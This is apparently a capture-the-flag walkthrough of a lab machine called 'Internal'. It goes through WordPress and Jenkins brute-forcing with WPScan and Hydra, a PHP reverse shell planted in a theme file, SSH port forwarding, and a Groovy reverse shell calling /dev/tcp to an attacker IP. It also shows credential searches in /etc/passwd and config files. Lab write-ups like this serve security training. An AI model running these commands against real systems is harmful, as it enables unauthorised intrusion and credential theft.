Internal
Reconnaissance

As always, we start with an nmap scan:

nmap -sC -sV <target-ip>

The scan reveals two open ports:

22/tcp open ssh
80/tcp open http

We can see that SSH (22) and HTTP (80) are open.

When visiting port 80, we are greeted with the default Apache page.




Since there is nothing useful on the page, it's time to start enumerating.

Initial Enumeration

First, we add the target to our hosts file:

echo "<target-ip> internal.thm" | sudo tee -a /etc/hosts

Next, we perform directory enumeration:

feroxbuster -u http://internal.thm/ \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

The results suggest that a WordPress site is being hosted.

Browsing the discovered directories reveals:

http://internal.thm/blog

which appears to be a standard WordPress installation.




WordPress Enumeration

To enumerate WordPress, we use WPScan.

First, create an account on WPVulnDB and obtain an API token.

Then run:

sudo wpscan \
--url http://internal.thm/blog \
--enumerate \
--api-token <token>

After the scan completes, we discover a valid user:

admin




Now that we have a username, we can attempt to discover the password.

Brute Forcing WordPress Credentials

We use WPScan's XML-RPC password attack feature:

sudo wpscan \
--password-attack xmlrpc \
-t 20 \
-U admin \
-P /usr/share/wordlists/rockyou.txt \
--url http://internal.thm/blog

After a short time, WPScan successfully discovers the password.




Using the recovered credentials, we log into the WordPress administration panel.




Gaining Initial Access

Inside the WordPress dashboard, we navigate to:

Appearance → Theme Editor

A common technique is to modify an existing theme file and replace it with a PHP reverse shell.

The file I typically modify is:

404.php

For the payload, I used the PHP PentestMonkey reverse shell.

Before triggering the shell, start a listener:

nc -lvnp 4444

Replace the contents of 404.php with the reverse shell code and update the file.

Since WordPress themes are located under:

/wp-content/themes/<theme-name>/

we can trigger the shell by visiting:

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

As soon as the page loads, we receive a reverse shell.




Post Exploitation Enumeration

The first thing I usually do after obtaining a shell is check which users have valid login shells.

cat /etc/passwd

Reviewing the output reveals an interesting user:

aubreanna

Since user pivoting is often easier than direct privilege escalation, I start looking for credentials.

I begin by searching for text files:

find / -name "*.txt" -readable -type f 2>/dev/null

This reveals an interesting file:

/opt/wp-save.txt

Inside the file we discover credentials belonging to aubreanna.




Normally I would also check files such as:

grep 'DB_USER\|DB_PASSWORD' wp-config.php

and

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

because WordPress configurations often contain credentials.

Pivoting to Aubreanna

Using the credentials from wp-save.txt, we SSH into the machine:

ssh aubreanna@internal.thm

After logging in, we discover a note mentioning an internal Jenkins service:

Internal Jenkins service is running on 172.17.0.2:8080

This service is only accessible internally, so we need to forward the port.

Port Forwarding Jenkins

We create an SSH tunnel:

ssh -L 6767:localhost:8080 aubreanna@internal.thm

Now we can access Jenkins locally by browsing to:

http://localhost:6767

Opening the page reveals a Jenkins login portal.




Jenkins Enumeration

I spent some time searching the system for Jenkins credentials but couldn't find anything useful.

The default Jenkins username is usually:

admin

Naturally, I first tried credentials such as:

admin:admin
admin:jenkins

but neither worked.

I intercepted a login request using Burp Suite and built a Hydra command:

hydra -s 6767 127.0.0.1 -f http-form-post \
"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" \
-V -l admin \
-P /usr/share/wordlists/rockyou.txt

Eventually Hydra discovers the correct password.




Using the recovered credentials, we successfully log into Jenkins.

Jenkins Remote Code Execution

Inside Jenkins we navigate to:

/ script

The Script Console allows arbitrary Groovy code execution.

First, start a listener:

nc -lvnp 8443

Then execute the following reverse shell:

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<your-ip>/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()

Once executed, we receive a reverse shell.




We now have access as the jenkins user.

Privilege Escalation

Now that we have access to the Jenkins container, we start looking for credentials.

One of the first places I checked was the /opt directory.

While enumerating, I found an interesting file:

notes.txt

Inside were credentials belonging to the root user.




Using these credentials, we connect via SSH:

ssh root@internal.thm

The login succeeds.

Root Flag

With root access obtained, we can retrieve the final flag:

cat /root/root.txt

Mission accomplished
